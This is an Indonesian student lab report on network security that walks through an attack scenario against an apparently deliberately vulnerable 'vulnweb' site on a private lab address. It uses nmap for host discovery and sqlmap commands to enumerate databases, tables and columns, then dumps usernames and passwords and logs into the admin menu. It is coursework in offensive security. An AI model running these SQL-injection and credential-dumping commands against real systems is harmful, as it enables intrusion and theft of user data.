<h3 align="center">
    <b>Kemanan Jaringan</b><br>
    Attack Scenario
</h3>
<br>
<p align="center">
  <img src="./Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.001.png" width="300">
</p>
<br>
<p align="center">
    Dosen Pembimbing:<br>
    Ferry Astika Saputra, S.T., M.Sc.
</p>
<br>
<p align="center">
    Disusun Oleh:<br>
    Iqbal Darmawan (3122640041)
</p>
<br>
<p align="center">
    <b>
        KELAS D4 LJ IT B <br>
        JURUSAN D4 LJ TEKNIK INFORMATIKA <br>
        DEPARTEMEN TEKNIK INFORMATIKA DAN KOMPUTER <br> 
        POLITEKNIK ELEKTRONIKA NEGERI SURABAYA <br>
        2023
    </b>
</p>
<br>
<br>

1\.  Mengakses Database 

1. Dapatkan Ip dari kali linux yang digunakan untuk menyerang 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.002.png)

2. gunakan Ipcalc untuk mendapatkan range dari IP 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.003.png)

3. Nmap untuk mendapatkan Ip dari target yang ingin diserang atau Ip yang juga tersambung pada range yang sama 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.004.png)

4. buka ip pada browser 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.005.jpeg)

5. coba jalankan menggunakan SQLMap sqlmap -u “Url” –dbs : untuk mendapatkan data database yang ada 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.006.png)

6. disini saya ingin melihat tabel pada database vulnweb. 

sqlmap -u “url” -D vulnweb –tables : untuk melihat daftar list table pada database vulnweb 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.007.jpeg)

7. selanjutnya kita lihat kolom yang ada pada tabel user  

sqlmap -u “url” -T user –columns : untuk melihat daftar kolom pada tabel 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.008.jpeg)

8. selanjutnya kita dapatkan data dari tiap kolom tabel user  

sqlmap -u “url” -C id\_user,password,username –dump : digunakan untuk mendapatkan data id\_user, password, dan username 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.009.png)

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.010.png)

9. selanjutnya masuk ke menu admin untuk melihat isi data yang ada di aplikasinya 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.011.jpeg)

10. Lihat salah satu data untuk mengetahui isi database 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.012.jpeg)

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.013.jpeg)

11. Jalankan Perintah  

sqlmap -u "http://192.168.30.148/?tampil=artikel\_detail&id=85" -C gambar,hits,id\_artikel,isi,judul,tanggal –dump 

untuk menampilkan data sql 

![](Aspose.Words.dc8654be-2886-4dc9-a6ef-7ce7861c0de0.014.jpeg)
